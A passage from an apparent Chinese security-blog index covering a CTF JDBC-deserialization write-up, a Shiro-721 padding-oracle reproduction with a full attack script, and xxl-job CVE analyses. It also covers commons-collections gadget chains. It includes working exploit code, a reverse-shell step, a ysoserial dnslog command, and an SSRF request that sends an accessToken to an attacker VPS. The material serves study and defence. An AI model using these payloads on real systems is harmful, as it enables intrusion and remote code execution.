obj;&#125;\n\n先看一下serialkiller.conf这个是什么东西。\n\n好像是一个过滤，还是白名单的， 这些正则表达式的作用是允许（即通过白名单）特定的命名空间或类名，例如以 gdufs. 和 java.lang. 开头的类或模块可以被接受，而不受限制。\n因为lib里面有commons-collections-3.2.1.jar，所以可以使用cc5或者cc7来进行反序列化执行命令。\n\n然后进入DatabaseInfo类，可以看到url是由各个参数拼接起来的，没有啥过滤，直接先测试一下能不能弹。\n\n因为在checkAllInfo中使用了connect方法，所以测试中就直接调用checkAllInfo方法了。\npackage gdufs.challenge.web;import gdufs.challenge.web.model.DatabaseInfo;public class cat &#123;    public static void main(String[] args) &#123;        DatabaseInfo databaseInfo = new DatabaseInfo();        databaseInfo.setHost(&quot;127.0.0.1&quot;);        databaseInfo.setPort(&quot;3307&quot;);        databaseInfo.setUsername(&quot;demo&quot;);        databaseInfo.setPassword(&quot;demo&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;);        databaseInfo.checkAllInfo();    &#125;&#125;\n\npython服务使用之前的代码，然后直接更改ser.bin为cc5的就可以了。\n\n成功弹出计算器。\n然后需要去寻找可以在反序列化时可以调用checkAllInfo的方法了。\n只有一个实现方法，就在InfoInvocationHandler的invoke方法中， 这是一个动态代理的实现类，当代理的实例对象在执行任何方法时都会触发invoke方法。而在hello路由中，被反序列化的数据出来之后会触发getAllInfo()方法，并且题目有Info接口，从而实现动态代理。\n所以只需要把databaseinfo传给InfoInvocationHandler进行动态代理即可触发jdbc。再进行反序列化和base64处理输出即可。\npackage gdufs.challenge.web;import gdufs.challenge.web.invocation.InfoInvocationHandler;import gdufs.challenge.web.model.DatabaseInfo;import gdufs.challenge.web.model.Info;import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Proxy;import java.util.Base64;public class cat &#123;    public static void main(String[] args) throws Exception&#123;        DatabaseInfo databaseInfo = new DatabaseInfo();        databaseInfo.setHost(&quot;120.76.143.184&quot;); //服务器的ip        databaseInfo.setPort(&quot;3307&quot;);        databaseInfo.setUsername(&quot;demo&quot;);        databaseInfo.setPassword(&quot;demo&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;);        InfoInvocationHandler infoInvocationHandler = new InfoInvocationHandler(databaseInfo);        Info proxinfo = (Info) Proxy.newProxyInstance(Info.class.getClassLoader(), new Class[] &#123;Info.class&#125;, infoInvocationHandler);        ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream=new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(proxinfo);        objectOutputStream.close();        String str=new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()));        System.out.println(str);    &#125;&#125;\n\n记得改cc5的执行为反弹shell\n先去index路由传一个username和password，这样就不需要自己来构造Cookie的格式了。\n\n然后输入序列化数据即可成功反弹shell\n","categories":["java反序列化"],"tags":["java反序列化"]},{"title":"shiro-721","url":"/2025/05/22/shiro-721/","content":"环境搭建有点小懒哈哈，就直接用的Drunkbaby师傅的环境了，直接用downgit下载了，然后和shiro550一样配一个tomcat就可以了，搭建好之后就是这样子的。\n\n漏洞分析这个漏洞主要基于Padding Oracle Attack攻击，由于shiro对cookie的加密模式为AES-CBC，并且可以从返回中得到从而导致了这个漏洞的存在\nPadding Oracle Attack原理可以参考这几个佬写的，写的很详细。\nhttps://goodapple.top/archives/217\nhttps://lightless.me/archives/padding-oracle-attacks.html#_label2_0\nhttps://drun1baby.top/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#Padding-Oracle-Attack-%E6%9E%84%E9%80%A0%E5%8A%A0%E5%AF%86%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90\n我个人的理解是，通过是否能使明文符合填充规律的判断来依次爆破iv最后一个字节到第一个字节的值，以此得到所有正确的明文以及中间值，然后将iv进行修改，从而异或出想要的明文。\nPadding Oracle Attack的利用条件有几个:\n\n是使用AES-CBC进行加密的\n可以获取到密文以及iv\n可以观察到解密的结果是否正确\n\n加密代码分析首先是他的加密代码，在之前的shiro550漏洞的分析过程中，通过对其解密方式的分析寻找到了其AES加密的默认密钥，而后续shiro将默认密钥取消，更改为如果用户不自己设置密钥，就随机生成，在那段代码中就存在AES加密的实现代码。\n首先，找到org.apache.shiro.mgt.AbstractRememberMeManager#AbstractRememberMeManager这个方法就是之前shiro550中找到密钥的方法。\n\n然后看到其加密是调用了AesCipherService这个类的，跟进这个类\n\n这个类很简单，但是他是继承了DefaultBlockCipherService这个类的，所以继续跟进到DefaultBlockCipherService这个类中\n\n找到他的构造函数， 其中继承了父类并初始化了加密算法，其中设置了加密模式为CBC， 并将流式加密的填充方案设置为 PKCS5，这就构成了Padding Oracle Attack的部分条件，也就是加密为AEC-CBC模式。\n密钥生成这里调试一下，来跟一下它密钥生成的过程。\n\n首先可以看到其初始化的一些参数， shiro是通过generateNewKey()方法来获取密钥的，所以调试到generateNewKey中\n\n继续步入到generateNewKey，\n\n然后初始化了一个KeyGenerator，其中getAlgorithmName的参数就是AES，随后调用init()方法，继续步入init()。\n\n其中JceSecurity.RANDOM是一个预定义的 SecureRandom 对象，通常用于提供安全的随机数，随后步入到下面的init()方法中，\n\n其进行了一个初始化的操作，其中engineInit方法用于初始化 AES 加密引擎，继续调试，在engineGenerateKey方法中下一个断点。\n\n这个方法是用于AES的密钥生成的，其中通过定义好的密钥大小进行随机生成密钥。\n\n可以看到密钥已经成功生成了，随后跟进到getEncoded中。\n\n将密钥读取出来，从而完成密钥生成操作\nShiro中的cookie处理操作分析错误处理首先找到解密函数org.apache.shiro.mgt.AbstractRememberMeManager#decrypt()\n\n继续跟进到cipherService.decrypt中，\n\n这个方法用于解密操作，并提取初始化iv，继续跟进到下一个decrypt中。\n\n步入crypt，其进入了doFinal方法。\n\n跟进到doFinal，可以发现其有两个异常处理，分别用于捕获块大小异常和填充错误异常。\n\n如果出现异常的话将会被抛出到crypt() 方法中，并且进入onRememberedPrincipalFailure方法。\n\n跟进到onRememberedPrincipalFailure方法，这个方法又调用了forgetIdentity方法，这个方法就是输出Set-Cookie: rememberMe=deleteMe的方法，因此如果Padding不正确将会输出Set-Cookie: rememberMe=deleteMe。\n\n正确处理当没有报出异常时，程序将继续运行，从而获取于返回解密后的序列化数据。\n\n返回序列化数据后，就和shiro550的反序列化处理是一样的了。\n\n\n\n由于有俩个不同的返回值，正确时正常返回，错误时返回Set-Cookie: rememberMe=deleteMe，因此构成了Padding Oracle Attack的条件。\n漏洞复现首先就是使用yso生成一个payload.class文件，\njava -jar ysoserial-all.jar URLDNS &quot;http://zjc7fd.dnslog.cn&quot; &gt; payload.class\n\n然后用这个脚本跑https://github.com/inspiringz/Shiro-721\n#https://github.com/3ndz/Shiro-721  # -*- coding: utf-8 -*-  from paddingoracle import BadPaddingException, PaddingOracle  from base64 import b64encode, b64decode  from urllib import quote, unquote  import requests  import socket  import time    class PadBuster(PaddingOracle):      def __init__(self, **kwargs):          super(PadBuster, self).__init__(**kwargs)          self.session = requests.Session()          self.wait = kwargs.get(&#x27;wait&#x27;, 2.0)        def oracle(self, data, **kwargs):          somecookie = b64encode(b64decode(unquote(sys.argv[2])) + data)          self.session.cookies[&#x27;rememberMe&#x27;] = somecookie          if self.session.cookies.get(&#x27;JSESSIONID&#x27;):              del self.session.cookies[&#x27;JSESSIONID&#x27;]          while 1:              try:                  response = self.session.get(sys.argv[1],                          stream=False, timeout=5, verify=False)                  break              except (socket.error, requests.exceptions.RequestException):                  logging.exception(&#x27;Retrying request in %.2f seconds...&#x27;,                                    self.wait)                  time.sleep(self.wait)                  continue            self.history.append(response)          if response.headers.get(&#x27;Set-Cookie&#x27;) is None or &#x27;deleteMe&#x27; not in response.headers.get(&#x27;Set-Cookie&#x27;):              logging.debug(&#x27;No padding exception raised on %r&#x27;, somecookie)              return          raise BadPaddingException      if __name__ == &#x27;__main__&#x27;:      import logging      import sys        if not sys.argv[3:]:          print &#x27;Usage: %s &lt;url&gt; &lt;somecookie value&gt; &lt;payload&gt;&#x27; % (sys.argv[0], )          sys.exit(1)        logging.basicConfig(level=logging.DEBUG)      encrypted_cookie = b64decode(unquote(sys.argv[2]))      padbuster = PadBuster()      payload = open(sys.argv[3], &#x27;rb&#x27;).read()      enc = padbuster.encrypt(plaintext=payload, block_size=16)      print(&#x27;rememberMe cookies:&#x27;)      print(b64encode(enc))\n\n将paddingoracle.py下载下来然后放在一个目录里就可以了\n目录如下\n\npython2 1.py http://192.168.45.1:8080/shiro721_war/account ODTZF2XfGvZt6Sd7nPr1uobDF3wEPLFATG4FI/AnHlfqK84poH1O29Isv1b28yKUPb4Q0+mQJJIOdLjxUGQ/yH6tfO+/vv0ELaDPr10htVAClDEdYbtWN8LETc8tCiAwYshj0ScvakVXDbmjcIVkUA2HEP0KPJJbO5Fy6MgG27XXhikyVnehaqITonX9C1EVFGuvzCZPZygYlHP3Lw+VAXMQ7+fD0P5OrmIwk60DqE7cFWSxkXMi/Q7odK0blH/6rvOrLcirrga0bIi0+6RN/F0Sl9zQSnZCZlZylT1c8HvxYCLblmnZjh8FG7RZpYO4mTkuGp2b6KqkLUEC4cXO+dMGYcscAUWOc+RUeBsSLlB/j/UodYfa98Gzf2luMldcDX1K5YN+Z2j0Qj9TQbU6OTmxbr6+FD9Sf7bJuU8lRQyNSj2sygd/9Q3U5nDUQTq4/B3rb6afnfRYHeG8A4qaNgiYHJxIZ+BcTgclz6IMp4bkGYWdTFcTBMwplckHWpop payload.class\n\n执行成功\n\n工具复现，这个是真快我丢\n\n","categories":["java反序列化"],"tags":["java反序列化"]},{"title":"xxl-job子任务越权漏洞代码分析及修复代码分析(CVE-2024-42681)","url":"/2025/04/11/xxl-job%E5%AD%90%E4%BB%BB%E5%8A%A1%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90(CVE-2024-42681)/","content":"漏洞介绍在xxl-job中，普通用户本应该只能查看和执行他们分配到的执行程序上的任务，并且无法查看与执行未分配到的执行程序的任务。但在2.4.1版本中，普通用户可以通过在执行程序 A 上创建任务并使用子任务 ID，从而执行管理员权限才能执行的执行程序 B 上的子任务。\n漏洞代码分析首先，因为是执行时触发的，所以可以直接找到com.xxl.job.admin.controller.JonInfoController这个控制执行程序的类。\n看到其中的权限控制部分\n\npublic static List&lt;XxlJobGroup&gt; filterJobGroupByRole(HttpServletRequest request, List&lt;XxlJobGroup&gt; jobGroupList_all)&#123;    // 创建一个空的列表，用于存储过滤后的组    List&lt;XxlJobGroup&gt; jobGroupList = new ArrayList&lt;&gt;();        // 如果传入的列表不为空且大小大于0    if (jobGroupList_all != null &amp;&amp; jobGroupList_all.size() &gt; 0) &#123;                // 获取当前登录用户对象，存储在请求的属性中，LOGIN_IDENTITY_KEY 是常量表示用户身份信息        XxlJobUser loginUser = (XxlJobUser) request.getAttribute(LoginService.LOGIN_IDENTITY_KEY);                // 检查用户角色，如果角色是 1，则表示是管理员，管理员可以看到所有组        if (loginUser.getRole() == 1) &#123;            // 如果是管理员，直接返回所有的组            jobGroupList = jobGroupList_all;        &#125; else &#123;            // 如果不是管理员，创建一个列表用于存储用户拥有权限的组 ID            List&lt;String&gt; groupIdStrs = new ArrayList&lt;&gt;();                        // 如果用户的权限字符串不为空，解析出权限字符串并分割为一个列表            if (loginUser.getPermission() != null &amp;&amp; loginUser.getPermission().trim().length() &gt; 0) &#123;                // 将权限字符串（以逗号分隔）转换为列表                groupIdStrs = Arrays.asList(loginUser.getPermission().trim().split(&quot;,&quot;));            &#125;                        // 遍历所有的组列表            for (XxlJobGroup groupItem : jobGroupList_all) &#123;                // 如果当前组的 ID 存在于用户的权限列表中，则加入到返回的列表中                if (groupIdStrs.contains(String.valueOf(groupItem.getId()))) &#123;                    jobGroupList.add(groupItem);                &#125;            &#125;        &#125;    &#125;        // 返回过滤后的组列表    return jobGroupList;&#125;\n\n其中filterJobGroupByRole方法，如果登录为管理员则返回所有执行器，如果不为管理员，则判断用户权限，从而返回相应权限的执行器。\npublic static void validPermission(HttpServletRequest request, int jobGroup) &#123;    // 从请求对象中获取当前登录的用户    XxlJobUser loginUser = (XxlJobUser) request.getAttribute(LoginService.LOGIN_IDENTITY_KEY);        // 调用 loginUser 的 validPermission 方法来验证用户是否有权限访问指定的组    if (!loginUser.validPermission(jobGroup)) &#123;        // 如果用户没有权限，抛出运行时异常，并将错误信息拼接上用户名        throw new RuntimeException(I18nUtil.getString(&quot;system_permission_limit&quot;) + &quot;[username=&quot; + loginUser.getUsername() + &quot;]&quot;);    &#125;&#125;\n\n第二个方法为validPermission方法，主要用于验证用户是否有权限进行运行。\n检查过后，其实可以发现并没有什么特别明显的漏洞，说明权限绕过的问题并不是出现在这段检查用户权限的代码中。\n然后进入处理子任务id的代码段去进行检查，这段代码位于com.xxl.job.admin.service.impl.XxlJobServiceImpl类中，这个类主要是用于子任务的整个生命周期管理和调度控制。\n\n看到处理子任务id的代码段,add和updata之间是一样的\nif (jobInfo.getChildJobId()!=null &amp;&amp; jobInfo.getChildJobId().trim().length()&gt;0) &#123;\tString[] childJobIds = jobInfo.getChildJobId().split(&quot;,&quot;);\tfor (String childJobIdItem: childJobIds) &#123;\t\tif (childJobIdItem!=null &amp;&amp; childJobIdItem.trim().length()&gt;0 &amp;&amp; isNumeric(childJobIdItem)) &#123;\t\t\tXxlJobInfo childJobInfo = xxlJobInfoDao.loadById(Integer.parseInt(childJobIdItem));\t\t\tif (childJobInfo==null) &#123;\t\t\t\treturn new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE,\t\t\t\t\t\tMessageFormat.format((I18nUtil.getString(&quot;jobinfo_field_childJobId&quot;)+&quot;(&#123;0&#125;)&quot;+I18nUtil.getString(&quot;system_not_found&quot;)), childJobIdItem));\t\t\t&#125;\t\t&#125; else &#123;\t\t\treturn new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE,\t\t\t\t\tMessageFormat.format((I18nUtil.getString(&quot;jobinfo_field_childJobId&quot;)+&quot;(&#123;0&#125;)&quot;+I18nUtil.getString(&quot;system_unvalid&quot;)), childJobIdItem));\t\t&#125;\t&#125;\n\n这段代码是对子任务id进行的检测， 具体来说，它是验证子作业ID是否有效，并且检查每个子作业ID是否存在。其实可以发现，这段代码中并没有对当前用户是否对子任务有操作权限的验证，所以任何用户都可以添加任何一个任务组中的子任务，从而造成漏洞。\n因为这段代码是在add以及updata中的，所以在添加的时候，如果有一个普通用户，其只对任务A有权限进行执行操作，而任务B中拥有一个子任务2，则这个普通用户可以在进行添加操作时，添加子任务2，因为没有对子任务id进行权限验证，这时，普通用户所添加的任务不仅有自身的子任务2同时也添加上了任务B中的子任务2。\n现在，我们再查看执行时的代码有没有对子任务的权限进行检测，如果没有那就会同时执行任务A与任务B中的子任务2。\n执行代码位于trigger方法中\n\npublic ReturnT&lt;String&gt; trigger(XxlJobUser loginUser, int jobId, String executorParam, String addressList) &#123;\t// permission\tif (loginUser == null) &#123;\t\treturn new ReturnT&lt;String&gt;(ReturnT.FAIL.getCode(), I18nUtil.getString(&quot;system_permission_limit&quot;));\t&#125;\tXxlJobInfo xxlJobInfo = xxlJobInfoDao.loadById(jobId);\tif (xxlJobInfo == null) &#123;\t\treturn new ReturnT&lt;String&gt;(ReturnT.FAIL.getCode(), I18nUtil.getString(&quot;jobinfo_glue_jobid_unvalid&quot;));\t&#125;\tif (!hasPermission(loginUser, xxlJobInfo.getJobGroup())) &#123;\t\treturn new ReturnT&lt;String&gt;(ReturnT.FAIL.getCode(), I18nUtil.getString(&quot;system_permission_limit&quot;));\t&#125;\t// force cover job param\tif (executorParam == null) &#123;\t\texecutorParam = &quot;&quot;;\t&#125;\tJobTriggerPoolHelper.trigger(jobId, TriggerTypeEnum.MANUAL, -1, null, executorParam, addressList);\treturn ReturnT.SUCCESS;&#125;\n\n这段代码中，只对用户与任务组的id之间的权限进行了检测，并没有对用户与子任务之间的权限进行检查，也没有判断子任务是否为目标执行的任务组中的子任务。\n综上所属，该漏洞成因为在添加子任务时，没有对用户是否可以对子任务的执行进行权限检测，并且在执行过程中也没有对子任务进行是否有执行权限进行检查，从而导致在运行当前用户的任务组中子任务的同时，也对其他没有权限的任务组中的相同id的子任务进行了执行，从而造成越权漏洞。\n修复代码分析\n可以看到，作者在修复时对add接口与update接口都添加了LoginUser参数，这个参数是用于判断当前用户的参数。\n也就是将鉴权的代码分出了一个部分，让其返回user。\n\n然后，又在add与update中对子任务的验证过程中，添加了对于用户是否有对目标子任务有操作权限的验证。\n\nif (!loginUser.validPermission(childJobInfo.getJobGroup())) &#123;\treturn new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE,\t\t\tMessageFormat.format((I18nUtil.getString(&quot;jobinfo_field_childJobId&quot;)+&quot;(&#123;0&#125;)&quot;+I18nUtil.getString(&quot;system_permission_limit&quot;)), childJobIdItem));&#125;\n\n有了这段代码，就不会将没有操作权限的子任务加入到有权限的任务组中，造成越权行为了。\n","categories":["java反序列化"],"tags":["java反序列化"]},{"title":"xxl-job_2.4.1ssrf漏洞代码分析(CVE-2024-24113)","url":"/2025/03/28/xxl-job_2.4.1ssrf%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90(CVE-2024-24113)/","content":"漏洞介绍这个漏洞是通过利用ssrf获取用户的 accessToken 进行的任意命令执行漏洞，命令执行部分与之前的默认accessToken的部分基本一致。\nRCE漏洞代码分析首先，我们要清楚为什么获取到了accessToken就可以进行RCE，这离不开以下三个问题：\n\naccessToken是什么\n是通过什么方式进行命令执行的\n命令执行代码分析\n\naccessToken是什么accessToken是XXL-JOB用于校验调度中心（Admin）与执行器（Executor）之间通信合法性的凭证。\n是通过什么方式进行命令执行的执行器是我们执行代码的平台，也就是说如果我们获取了accessToken，我们就可以伪造成校验调度中心，使执行器执行指定代码，这个Rce点在之前的accessToken 默认身份绕过有提到，在2.4.1版本代码基本上没有进行更改，所以如果我们获取到了accessToken的值也是可以进行任意命令执行的。\n2.4.1版本任意命令执行代码分析可以参考一下以前版本的rce漏洞的分析：https://xz.aliyun.com/news/12414\n之前提到了，在2.4.1版本中，漏洞代码与之前版本的变化不大，也是通过&#x2F;run路由进行执行，所以这里我并不进行过多分析。\n我们可以进入xxl-job-core中进行查看目标路由。\nprivate Object process(HttpMethod httpMethod, String uri, String requestData, String accessTokenReq) &#123;            // valid            if (HttpMethod.POST != httpMethod) &#123;                return new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE, &quot;invalid request, HttpMethod not support.&quot;);            &#125;            if (uri == null || uri.trim().length() == 0) &#123;                return new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE, &quot;invalid request, uri-mapping empty.&quot;);            &#125;            if (accessToken != null                    &amp;&amp; accessToken.trim().length() &gt; 0                    &amp;&amp; !accessToken.equals(accessTokenReq)) &#123;                return new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE, &quot;The access token is wrong.&quot;);            &#125;            // services mapping            try &#123;                switch (uri) &#123;                    case &quot;/beat&quot;:                        return executorBiz.beat();                    case &quot;/idleBeat&quot;:                        IdleBeatParam idleBeatParam = GsonTool.fromJson(requestData, IdleBeatParam.class);                        return executorBiz.idleBeat(idleBeatParam);                    case &quot;/run&quot;:                        TriggerParam triggerParam = GsonTool.fromJson(requestData, TriggerParam.class);                        return executorBiz.run(triggerParam);                    case &quot;/kill&quot;:                        KillParam killParam = GsonTool.fromJson(requestData, KillParam.class);                        return executorBiz.kill(killParam);                    case &quot;/log&quot;:                        LogParam logParam = GsonTool.fromJson(requestData, LogParam.class);                        return executorBiz.log(logParam);                    default:                        return new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE, &quot;invalid request, uri-mapping(&quot; + uri + &quot;) not found.&quot;);                &#125;\n\n这一段代码与之前漏洞版本一样，首先是判断accessToken是否正确，然后进行路由判断，因为这里调用是run路由就直接去看他的实现方法。\n进入com.xxl.job.core.biz.impl.ExecutorBizImpl中，可以看到他的run方法。\n\n然后主要是他的命令执行方法。\n位于com.xxl.job.core.handler.impl的ScriptJobHandler类中\nif (!glueType.isScript()) &#123;    XxlJobHelper.handleFail(&quot;glueType[&quot;+ glueType +&quot;] invalid.&quot;);    return;&#125;// cmdString cmd = glueType.getCmd();// make script fileString scriptFileName = XxlJobFileAppender.getGlueSrcPath()        .concat(File.separator)        .concat(String.valueOf(jobId))        .concat(&quot;_&quot;)        .concat(String.valueOf(glueUpdatetime))        .concat(glueType.getSuffix());File scriptFile = new File(scriptFileName);if (!scriptFile.exists()) &#123;    ScriptUtil.markScriptFile(scriptFileName, gluesource);&#125;\n\n这段代码的核心逻辑为\n\n检查 glueType 是否为脚本类型。\n获取脚本执行命令和构建文件名。\n检查指定路径下的脚本文件是否存在，如果不存在，则创建这个脚本文件。\n\n从而可以执行命令。\nSSRF漏洞代码分析既然已经知道了只要拥有accessToken 的值就可以进行任意命令执行，那么就来分析一下获取accessToken 的ssrf代码。\n用户验证首先，我们知道在xxl-job-admin中可以向core发送指定内容，从而使core端执行特定代码，那么这个请求是哪个路由所发出的呢，通过对执行进行抓包可以发现是&#x2F;xxl-job-admin&#x2F;jobinfo&#x2F;trigger。\n\n查看对应代码，位于com.xxl.job.admin.controller.JobInfoController中。\n@RequestMapping(&quot;/trigger&quot;)@ResponseBodypublic ReturnT&lt;String&gt; triggerJob(HttpServletRequest request, int id, String executorParam, String addressList) &#123;\t// login user\tXxlJobUser loginUser = (XxlJobUser) request.getAttribute(LoginService.LOGIN_IDENTITY_KEY);\t// trigger\treturn xxlJobService.trigger(loginUser, id, executorParam, addressList);&#125;\n\n进入getAttribute中，这个接口有挺多实现的，可以挨个去瞅瞅或者直接调试，最终发现是使用的org.apache.catalina.connector.ReqestFacade中定义的getAttribute方法。\n\npublic Object getAttribute(String name) &#123;    this.checkFacade();    return this.request.getAttribute(name);&#125;\n\n因为checkFacade没有参数，应该不是验证的方法，就直接跳过去了。\n然后，继续跟进到org.apache.catalina.connector.Request中的getAttribute方法。\n\n最终返回了用户相关的值，所以这就是一个验证用户的函数。\n\nssrf关键代码接下来就是实现ssrf的关键代码了，造成这个漏洞的主要参数为addressList。\n首先跟进com.xxl.job.admin.service.impl.XxlJobServiceImpl中的trigger方法。\n\n这个方法前面都是鉴权，还需要继续跟进到com.xxl.job.admin.core.thread.JobTriggerPoolHelper中的trigger方法。\n\n这个方法又继续在进行调用，继续跟进，因为太长了就直接跳到最后一步了，最终走到了com.xxl.job.admin.core.trigger.XxlJobTrigger中进行了参数的设置，可以看到这里用我们上传的参数覆盖了原来的addressList。\n\n可以看到在到这一步时，已经有返回包了。\n\n但是还并没有像指定服务器发送请求。\n跟进最后一个方法processTrigger，这个方法是用于对目标服务器发送请求的方法，也就是造成ssrf的方法。\nTriggerParam triggerParam = new TriggerParam();triggerParam.setJobId(jobInfo.getId());triggerParam.setExecutorHandler(jobInfo.getExecutorHandler());triggerParam.setExecutorParams(jobInfo.getExecutorParam());triggerParam.setExecutorBlockStrategy(jobInfo.getExecutorBlockStrategy());triggerParam.setExecutorTimeout(jobInfo.getExecutorTimeout());triggerParam.setLogId(jobLog.getId());triggerParam.setLogDateTime(jobLog.getTriggerTime().getTime());triggerParam.setGlueType(jobInfo.getGlueType());triggerParam.setGlueSource(jobInfo.getGlueSource());triggerParam.setGlueUpdatetime(jobInfo.getGlueUpdatetime().getTime());triggerParam.setBroadcastIndex(index);triggerParam.setBroadcastTotal(total);// 3、init addressString address = null;ReturnT&lt;String&gt; routeAddressResult = null;if (group.getRegistryList()!=null &amp;&amp; !group.getRegistryList().isEmpty()) &#123;    if (ExecutorRouteStrategyEnum.SHARDING_BROADCAST == executorRouteStrategyEnum) &#123;        if (index &lt; group.getRegistryList().size()) &#123;            address = group.getRegistryList().get(index);        &#125; else &#123;            address = group.getRegistryList().get(0);        &#125;    &#125; else &#123;        routeAddressResult = executorRouteStrategyEnum.getRouter().route(triggerParam, group.getRegistryList());        if (routeAddressResult.getCode() == ReturnT.SUCCESS_CODE) &#123;            address = routeAddressResult.getContent();        &#125;    &#125;&#125; else &#123;    routeAddressResult = new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE, I18nUtil.getString(&quot;jobconf_trigger_address_empty&quot;));&#125;// 4、trigger remote executorReturnT&lt;String&gt; triggerResult = null;if (address != null) &#123;    triggerResult = runExecutor(triggerParam, address);&#125;\n\n可以看到上面代码对指定参数进行了构造，并且到目前为止，所以代码都没有对我们输入的地址进行校验与核查。\n随后利用runExecutor 向选定的执行器地址发送HTTP请求，触发任务执行。\n从而使我们的服务器拿到http请求包，其中包含进行RCE所需的参数accessToken，从而造成Rce漏洞。\n\nexp如下POST /xxl-job-admin/jobinfo/trigger HTTP/1.1Host: 127.0.0.1:8080Content-Length: 59sec-ch-ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;104&quot;Accept: application/json, text/javascript, */*; q=0.01Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestsec-ch-ua-mobile: ?0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36sec-ch-ua-platform: &quot;Windows&quot;Origin: http://127.0.0.1:8080Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http://127.0.0.1:8080/xxl-job-admin/jobinfoAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=85b8fh88fc4idmgumrpm2vjf65; XXL_JOB_LOGIN_IDENTITY=7b226964223a322c22757365726e616d65223a2274657374222c2270617373776f7264223a223831646339626462353264303464633230303336646264383331336564303535222c22726f6c65223a302c227065726d697373696f6e223a2232227dConnection: closeid=3&amp;executorParam=1&amp;addressList=http://vps:端口","categories":["代码审计"],"tags":["java，代码审计"]},{"title":"java反序列化小结(1)","url":"/2025/06/06/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93(1)/","content":"前言这篇文章主要分享一下我个人在学习CC链时对CC链的一些总结和思路，望大佬们进行指正。\n我个人认为cc链可以分为俩个部分，一个是进行命令执行的部分，另一个是触发以及调用命令执行的部分，所以这篇文章就以这俩个部分来进行总结。\n命令执行部分ChainedTransformer调用Runtime首先就是最经典的ChainedTransformer链式调用Runtime\nTransformer[] transformers = new Transformer[]&#123;        new ConstantTransformer(Runtime.class),        new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),        new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;),&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n原理由于InvokerTransformer的transform方法可以对传入参数进行反射调用与执行，因此可以传入危险函数进行命令执行。\n\n并且因为Runtime是一个不可序列化的函数(没有实现序列化接口)，因此需要使用反射的方法让其可以序列化，而InvokerTransformer正好能实现这个功能。\nInvokerTransformer反射Runtime写法:\nMethod getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&#125;).transform(Runtime.class);Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);\n\n因为他是一个重复调用的一个过程，因此使用chainedTransformer来进行简化，chainedTransformer的transform方法可以重复调用数组中的transfrom方法，并且作为下一个transfrom方法的参数进行使用。\n\n而使用ConstantTransformer的原因是因为可以将参数固定在iConstant 中，保证无论调用什么对象都会返回Runtime.class。\n调用&amp;触发因此现在需要找到某个可以触发ChainedTransformer#transform方法的函数。\n[LazyMap&#x2F;DefaultedMap].get()在学习CC链的过程中不可或缺的就是LazyMap这个类，其中的get()方法可以触发指定参数的transform方法。\n\n并且有一个和LazyMap这个类十分相似的一个类就是DefaultedMap这个类，他的get方法和LazyMap一样都可以触发指定参数的transform方法，在正常使用的时候直接当成LazyMap进行使用即可。\n\n当然，直接触发map#get方法的类其实并不多，在学习CC链的过程中可以发现除了CC1的AnnotationInvocationHandler可以直接触发map#get其他的CC5，CC6，以及CC11其实都借助了一个类TiedMapEntry，通过这个类来触发LazyMap#get()，因此重心主要放到TiedMapEntry这个类中，这个类中的setValue方法可以触发map#get方法。\n\n而在这个类中又有三个方法可以触发该类的setValue，分别是equals、hashCode、toString这三个方法，\n\n\n\n因此只要可以触发这三个方法就可以调用Runtime来进行命令执行，当然如果可以直接触发LazyMap#get也是可以的。\nTransformedMap.setValue()除此之外还有TransformedMap#checkSetValue()这一方法也可以触发指定参数的transform，而setValue则是对该方法进行了调用。\n\n\nTransformingComparator.compare()除了map#put()之外还有org.apache.commons.collections4.comparators.TransformingComparator#compare也可以对任意方法的transform进行调用。\n\n因此如果存在类可以调用任意compare同样可以调用Runtime进行命令执行。\nClosureTransformer调用Runtime(无需数组)其实除